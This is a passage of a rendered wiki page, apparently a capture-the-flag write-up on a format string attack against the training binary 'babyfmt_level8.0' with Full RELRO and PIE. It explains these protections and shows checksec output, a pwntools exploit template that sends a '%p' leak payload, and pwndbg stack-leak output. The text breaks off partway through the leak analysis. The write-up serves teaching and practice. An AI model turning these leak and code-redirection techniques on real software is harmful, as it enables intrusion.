+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#babyfmt_level80" class="md-nav__link">
+    <span class="md-ellipsis">
+      babyfmt_level8.0
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="babyfmt_level8.0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-leak-points-in-stack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding leak points in stack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-offset-and-padlen" class="md-nav__link">
+    <span class="md-ellipsis">
+      find offset and padlen
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-the-suitable-target-for-code-redirection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Find the suitable target for code redirection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get_flagpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      get_flag.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../10-Format-String-Attack-Format-String-Attack-Once/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Format String Attack - Format String Attack Once (Partial RELRO + no PIE)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../11-Format-String-Attack-Format-String-Attack-Once-%28Partial-RELRO%2Bno-PIE%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Format String Attack - Format String Attack Once (Partial RELRO + no PIE)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../12-Format-String-Attack-Format-String-Attack-Twice-%28Full-RELRO%2BPIE%29/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Format String Attack - Format String Attack Twice (Full RELRO + PIE)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../13-Format-String-Attack-No-Dollar-Payload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Format String Attack - No Dollar Payload
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5_3">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Windows/Environment-setup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Environment setup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Redteam
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            Redteam
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Redteam/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Reverse
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            Reverse
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../Reverse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Crypto
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            Crypto
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../crypto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#babyfmt_level80" class="md-nav__link">
+    <span class="md-ellipsis">
+      babyfmt_level8.0
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="babyfmt_level8.0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#finding-leak-points-in-stack" class="md-nav__link">
+    <span class="md-ellipsis">
+      Finding leak points in stack
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-offset-and-padlen" class="md-nav__link">
+    <span class="md-ellipsis">
+      find offset and padlen
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-the-suitable-target-for-code-redirection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Find the suitable target for code redirection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get_flagpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      get_flag.py
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conclusion
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      References
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+    <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/blob/main/docs/Pwn/Linux/Format String Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-(Full-Relro+PIE-Enabled).md" title="Edit this page" class="md-content__button md-icon" rel="edit">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 20H6V4h7v5h5v3.1l2-2V8l-6-6H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h4zm10.2-7c.1 0 .3.1.4.2l1.3 1.3c.2.2.2.6 0 .8l-1 1-2.1-2.1 1-1c.1-.1.2-.2.4-.2m0 3.9L14.1 23H12v-2.1l6.1-6.1z"/></svg>
+    </a>
+  
+  
+    
+      
+    
+    <a href="https://github.com/ismailbozkurt/Dreamer-Wiki/raw/main/docs/Pwn/Linux/Format String Vulnerabilities/09-Format-String-Attack-Redirect-Code-Execution-(Full-Relro+PIE-Enabled).md" title="View source of this page" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h1 id="format-string-attack-redirect-code-execution-full-relropie-enabled">Format String Attack - Redirect Code Execution (Full Relro+PIE Enabled)</h1>
+<p>RELRO = <em>Relocation Read-Only</em>. It’s an ELF security hardening feature that changes how the <strong>Global Offset Table (GOT)</strong> is handled at runtime.</p>
+<p><strong>Full RELRO</strong> (compile with <code>-z relro -z now</code>):
+- The dynamic linker <strong>resolves all symbols immediately at startup</strong> (instead of lazy resolution).
+- After that, the <strong>entire GOT (including <code>.got.plt</code>) is made read-only</strong>.
+- This means you can’t perform classic GOT-overwrite attacks anymore.</p>
+<p>PIE = <em>Position Independent Executable</em>. It makes the binary behave like a shared library in terms of loading.<br />
+Instead of always loading at a fixed base address (e.g. <code>0x400000</code>), the <strong>entire binary is relocated to a random base address</strong> each run.</p>
+<p><strong>PIE enabled</strong>:
+   - Code section, functions, and globals shift to a different base address at each execution.
+   - Combined with <strong>ASLR</strong> (Address Space Layout Randomization), every run has a different layout. 
+   - Attacker must first <em>leak</em> an address to calculate offsets.</p>
+<h2 id="babyfmt_level80">babyfmt_level8.0</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nt">root</span><span class="p">@</span><span class="k">98c8193f4dfd</span><span class="o">:/</span><span class="nt">host</span><span class="err">#</span><span class="w"> </span><span class="nt">checksec</span><span class="w"> </span><span class="o">./</span><span class="nt">babyfmt_level8</span><span class="p">.</span><span class="nc">0</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="o">[*]</span><span class="w"> </span><span class="s1">&#39;/host/babyfmt_level8.0&#39;</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nt">Arch</span><span class="o">:</span><span class="w">       </span><span class="nt">amd64-64-little</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nt">RELRO</span><span class="o">:</span><span class="w">      </span><span class="nt">Full</span><span class="w"> </span><span class="nt">RELRO</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nt">Stack</span><span class="o">:</span><span class="w">      </span><span class="nt">Canary</span><span class="w"> </span><span class="nt">found</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="nt">NX</span><span class="o">:</span><span class="w">         </span><span class="nt">NX</span><span class="w"> </span><span class="nt">enabled</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="w">    </span><span class="nt">PIE</span><span class="o">:</span><span class="w">        </span><span class="nt">PIE</span><span class="w"> </span><span class="nt">enabled</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="w">    </span><span class="nt">SHSTK</span><span class="o">:</span><span class="w">      </span><span class="nt">Enabled</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="w">    </span><span class="nt">IBT</span><span class="o">:</span><span class="w">        </span><span class="nt">Enabled</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="w">    </span><span class="nt">Stripped</span><span class="o">:</span><span class="w">   </span><span class="nt">No</span>
+</code></pre></div>
+<p>The challenge same as previous one except, This time <strong>PIE</strong> enabled and <strong>FULL RELRO</strong> . That means explained above, GOT is not writable also code section, functions, and globals shift to a different base address at each execution.</p>
+<p>The way to achieve flag is same. <strong>win</strong> function luckily still there. But the target is not clear as <strong>win</strong> function.</p>
+<p>After generating the template PoC with <strong>pwntools</strong> with <code>pwn template --libc=./libc.so.6 ./babyfmt_level8.0|tee exploit.py</code>, sent <code>%p|%p|%p|%p|%p|%p|%p|%p|</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1"># -*- coding: utf-8 -*-</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="c1"># This exploit template was generated via:</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># $ pwn template &#39;--libc=./libc.so.6&#39; ./babyfmt_level8.0</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c1"># Set up pwntools for the correct architecture</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">EXE</span> <span class="ow">or</span> <span class="s1">&#39;./babyfmt_level8.0&#39;</span><span class="p">)</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="c1"># Many built-in settings can be controlled on the command-line and show up</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="c1"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="c1"># for all created processes...</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="c1"># ./exploit.py DEBUG NOASLR</span>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="c1"># Use the specified remote libc version unless explicitly told to use the</span>
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="c1"># local system version with the `LOCAL_LIBC` argument.</span>
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="c1"># ./exploit.py LOCAL LOCAL_LIBC</span>
+<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL_LIBC</span><span class="p">:</span>
+<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>    <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
+<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a>    <span class="n">library_path</span> <span class="o">=</span> <span class="n">libcdb</span><span class="o">.</span><span class="n">download_libraries</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a>    <span class="k">if</span> <span class="n">library_path</span><span class="p">:</span>
+<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a>        <span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">patch_custom_libraries</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="n">library_path</span><span class="p">)</span>
+<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">exe</span><span class="o">.</span><span class="n">libc</span>
+<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a>        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a>
+<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="k">def</span><span class="w"> </span><span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="w">    </span><span class="sd">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a>    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a>        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a>
+<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="c1"># Specify your GDB script here for debugging</span>
+<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="c1"># GDB will be launched if the exploit is run via e.g.</span>
+<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="c1"># ./exploit.py GDB</span>
+<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="s1">brva 0x17a0</span>
+<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="s1">continue</span>
+<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>
+<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="c1">#===========================================================</span>
+<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="c1">#                    EXPLOIT GOES HERE</span>
+<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="c1">#===========================================================</span>
+<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="c1"># Arch:     amd64-64-little</span>
+<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="c1"># RELRO:      Full RELRO</span>
+<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="c1"># Stack:      Canary found</span>
+<a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="c1"># NX:         NX enabled</span>
+<a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="c1"># PIE:        PIE enabled</span>
+<a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="c1"># SHSTK:      Enabled</span>
+<a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="c1"># IBT:        Enabled</span>
+<a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="c1"># Stripped:   No</span>
+<a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a>
+<a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="k">def</span><span class="w"> </span><span class="nf">send_fmt</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+<a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a>    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;vulnerability:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>
+<a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>
+<a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>
+<a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a>
+<a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a><span class="c1">#### write part ####</span>
+<a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">30</span>
+<a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a><span class="n">padlen</span> <span class="o">=</span> <span class="mi">7</span>
+<a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a>
+<a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a><span class="n">send_fmt</span><span class="p">(</span><span class="s1">&#39;%p|%p|%p|%p|%p|%p|%p|%p|&#39;</span><span class="p">)</span>
+<a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a>
+<a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="finding-leak-points-in-stack">Finding leak points in stack</h3>
+<p>One screenshot but tells tons of things.</p>
+<blockquote>
+<p>1- 1st and 3rd offsets always points to address inside libc. So these addresses is could be targeted for libc calculations. The offset of the libc address marked with green box.
+2- Same examination could be follow after settling breakpoint at 0x17a0. In your binary the offset may different. So consider in your binary and environment.</p>
+</blockquote>
+<p>But only libc address is not enough, still need to find an address inside binary memory space. So can calculate the exe base address.</p>
+<p><img alt="" src="../images/200be3093ef050a25f19e30887ced260.png" /></p>
+<p>My workflow same as below. Checking stack with awesome features <strong><a href="https://pwndbg.re/pwndbg/latest/commands/memory/telescope/">telescope</a></strong> and <strong><a href="https://pwndbg.re/pwndbg/latest/commands/memory/probeleak/">probeleak</a></strong>.</p>
+<p>The below output shows where leaked address comes <em>0x00007f0b0a7e0297</em> address. If you look a little close, you can realize there is also addresses from executable memory space addresses comes after.</p>
+<p>The address <em>0x00007f0b0a7e0297</em> is the address of <strong>write+23</strong> and offset in libc: <em>0x10e297</em></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nt">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="nt">probeleak</span><span class="w"> </span><span class="o">$</span><span class="nt">rsp-0x100</span><span class="w"> </span><span class="nt">0x650</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nt">LEGEND</span><span class="o">:</span><span class="w"> </span><span class="nt">STACK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">HEAP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">CODE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">DATA</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">WX</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nt">RODATA</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="nt">0x010</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007ffd0b6ed970</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">rw-p</span><span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="nt">stack</span><span class="o">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x1f970</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="nt">0x018</span><span class="o">:</span><span class="w"> </span><span class="nt">0x00007f0b0a733d3f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">r-xp</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="nt">root</span><span class="o">/</span><span class="p">.</span><span class="nc">cache</span><span class="o">/</span><span class="p">.</span><span class="nc">pwntools-cache-3</span><span class="p">.</span><span class="nc">12</span><span class="o">/</span><span class="nt">libcdb_libs</span><span class="o">/</span><span class="nt">5792732f783158c66fb4f3756458ca24e46e827d</span><span class="o">/</span><span class="nt">libc-2</span><span class="p">.</span><span class="nc">31</span><span class="p">.</span><span class="nc">so</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">0x3fd3f</span><span class="w"> </span><span class="o">(</span><span class="nt">printf</span><span class="o">+</span><span class="nt">175</span><span class="o">)</span>
